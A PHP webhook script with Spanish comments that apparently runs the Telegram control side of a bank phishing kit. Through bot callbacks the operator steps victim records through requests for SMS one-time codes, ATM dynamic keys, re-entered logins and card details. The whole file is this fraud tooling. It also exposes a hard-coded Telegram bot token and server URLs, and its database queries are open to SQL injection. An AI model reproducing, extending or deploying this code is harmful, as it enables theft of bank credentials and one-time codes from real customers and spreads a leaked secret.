<?php
require_once('file_db.php');
require_once('file_functions.php');
define('TABLA_PUTO', value: 'datos');
$con = Database::getConnection();
$token = '';
$row = [
    'token_bank_telegram' => null
];

// Recuperar el token
if (isset($_GET['tok'])) {
    $token = $_GET['tok'];
} else if (isset($_POST['tok'])) {
    $token = $_POST['tok'];
} else {
    http_response_code(404);
    die("Token no proporcionado.");
}

$result = mysqli_query($con, "SELECT * FROM users WHERE cod_unico = '" . $token . "'");
if ($result && mysqli_num_rows($result) > 0) {
    $row = mysqli_fetch_assoc($result);
    $tokenTG = $row['token_bank_telegram'];
    // $tokenTG = $row['7065207650:AAHSqe9CQsjSmeF8DHp_JvvJ4eANHeQ24ns'];
} else {
    http_response_code(404);
    die("Token no encontrado en la base de datos.");
}


// $webhook_url = " https://4240-181-119-84-150.ngrok-free.app/webhook.php?tok=" . $token;
$webhook_url = "https://latam.servidoreshaz.online/webhook.php?tok=" . $token;
$get_webhook_info_url = 'https://api.telegram.org/bot' . $tokenTG . '/getWebhookInfo';
$response = file_get_contents($get_webhook_info_url);

if ($response === false) {
    error_log("Error al obtener información del webhook: No se pudo conectar a Telegram.");
    die("Error al obtener información del webhook.");
}

$webhook_info = json_decode($response, true);
if (!isset($webhook_info['result']['url'])) {
    error_log("Error: Respuesta inesperada de Telegram al obtener información del webhook.");
    die("Error: Respuesta inesperada de Telegram.");
}

print_r($webhook_info['result']['url']);

if ($webhook_info['result']['url'] !== $webhook_url) {
    $delete_response = file_get_contents('https://api.telegram.org/bot' . $tokenTG . '/deleteWebhook');
    if ($delete_response === false) {
        error_log("Error al eliminar el webhook existente.");
        die("Error al eliminar el webhook existente.");
    }

    $delete_result = json_decode($delete_response, true);
    if (!$delete_result['ok']) {
        error_log("Error al eliminar el webhook: " . $delete_result['description']);
        die("Error al eliminar el webhook: " . $delete_result['description']);
    }

    // $set_webhook_url = 'https://api.telegram.org/bot' . $tokenTG . '/setWebhook?url=' . $webhook_url;
    $set_webhook_url = 'https://api.telegram.org/bot' . $tokenTG . '/setWebhook?url=' . urlencode($webhook_url);

    $set_response = file_get_contents($set_webhook_url);
    if ($set_response === false) {
        print_r($set_response);
        error_log("Error al configurar el webhook.");
        die("Error al configurar el webhook.");
    }

    $set_result = json_decode($set_response, true);
    if (!$set_result['ok']) {
        error_log("Error al configurar el webhook: " . $set_result['description']);
        die("Error al configurar el webhook: " . $set_result['description']);
    }
} else {
    error_log("La URL del webhook ya está configurada correctamente.");
}
$input = file_get_contents('php://input');
$update = json_decode($input, true);


if (isset($update['callback_query'])) {
    print_r($update);
    $callback_query = $update['callback_query'];
    $chat_id = $callback_query['message']['chat']['id'];
    $callback_data = $callback_query['data'];

    $parts = explode('_', $callback_data);
    $action = $parts[0];
    $registro_id = $parts[1];
    $owner = isset($parts[2]) ? $parts[2] : null;
    $parts_log = print_r($parts, true);
    $hidden = isset($parts[3]) ? ($parts[3] === '1') : false;
    error_log("Parts $parts_log , Callback data: $owner owner - $action - $registro_id", 3, __DIR__ . "/error.log");


    switch ($action) {
        case 'solicitarotp':
            $response_message = order_otp($registro_id, 'sms');
            break;
        case 'errorlogin':
            $response_message = error_login($registro_id);
            break;
        case 'errorcard':
            $response_message = error_card($registro_id);
            break;
        case 'errorbank':
            $response_message = error_bank($registro_id);
            break;
        case 'pedirdinamica':
            $response_message = order_cajero($registro_id);
            break;
        case 'errorotp':
            $response_message = error_otp($registro_id);
            break;
        case 'errorcajero':
            $response_message = error_cajero($registro_id);
            break;
        case 'finish':
            $response_message = finish($registro_id);
            break;

        default:
            $response_message = "Acción no válida.";
            break;
    }

    send_message($response_message, $owner, $hidden);

    $callback_id = $callback_query['id'];
    answer_callback_query($callback_id);
}

function answer_callback_query($callback_id)
{
    global $token;

    $url = 'https://api.telegram.org/bot' . $token . '/answerCallbackQuery';
    $data = ['callback_query_id' => $callback_id];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

function error_bank($registro_id)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'error_bank'];
    actualizar_registro($registro_id, $array);

    return "Se ha marcado un error de banco para el registro ID $registro_id.";
}

function order_data($registro_id)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'req_email'];
    actualizar_registro($registro_id, $array);

    return "Se ha solicitado los datos para el registro ID $registro_id.";
}

function error_cajero($registro_id)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'error_cajero'];
    actualizar_registro($registro_id, $array);

    return "Se ha marcado un error de cajero para el registro ID $registro_id.";
}

function order_cajero($registro_id)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'req_cajero'];
    actualizar_registro($registro_id, $array);

    return "Se ha solicitado el cajero para el registro ID $registro_id.";
}

function order_otp($registro_id, $type)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'req_otp'];
    actualizar_registro($registro_id, $array);

    return "Se ha solicitado OTP para el registro ID $registro_id.";
}

function order_card($registro_id, $type)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'req_tarjeta' . ($type === 'credito' ? '_credito' : '')];
    actualizar_registro($registro_id, $array);

    return "Se ha solicitado la tarjeta para el registro ID $registro_id.";
}

function error_login($registro_id)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'req_login'];
    actualizar_registro($registro_id, $array);

    return "Se ha marcado un error de inicio de sesión para el registro ID $registro_id.";
}

function error_card($registro_id)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'error_cvv'];
    actualizar_registro($registro_id, $array);

    return "Se ha marcado un error de tarjeta para el registro ID $registro_id.";
}

function error_otp($registro_id)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'error_otp'];
    actualizar_registro($registro_id, $array);

    return "Se ha marcado un error de OTP para el registro ID $registro_id.";
}

function finish($registro_id, $finishDinamica = false)
{
    $registro = buscar_registro($registro_id);

    if (!$registro) {
        return "No se encontró el registro con ID $registro_id.";
    }

    $array = ['status' => 'finish'];
    actualizar_registro($registro_id, $array);

    return "Se ha finalizado el registro con ID $registro_id.";
}

function send_message($message, $owner, $is_bank = false)
{
    $db = Database::getConnection();
    $consulta = mysqli_query($db, "SELECT * FROM users WHERE id = '" . $owner . "'");

    while ($datos = mysqli_fetch_array($consulta)) {
        $token = $datos['token_' . ($is_bank ? 'bank' : 'card') . '_telegram'];
        $chat_id = $datos['chat_' . ($is_bank ? 'bank' : 'card') . '_telegram'];

        if (!$token || !$chat_id) {
            error_log("Token o chat_id no disponibles para owner: $owner");
            continue;
        }

        $api_url = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chat_id . '&text=' . urlencode($message);
        $response = file_get_contents($api_url);

        if ($response === false) {
            error_log("Error al enviar el mensaje al chat_id: $chat_id.");
        }

        return $response;
    }

    error_log("No se encontraron datos válidos para el owner: $owner.");
    return false;
}
